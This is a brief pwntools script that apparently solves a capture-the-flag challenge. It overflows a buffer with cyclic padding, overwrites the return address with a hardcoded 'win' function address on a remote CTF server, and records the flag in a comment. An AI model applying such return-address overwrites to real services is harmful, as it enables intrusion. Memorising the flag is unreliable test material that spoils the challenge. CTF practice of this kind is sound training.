from pwn import *

# p = process('./chal')
p = remote('pwn.ctf.ae', 9811)

win = 0x0000000000401d35

payload = b'A'*cyclic_find('saaa') # cyclic(1024)
payload += p64(win)

#pause()

p.sendline(payload)
p.interactive()

# CTFAE{YouAreAFunctionTraveller}
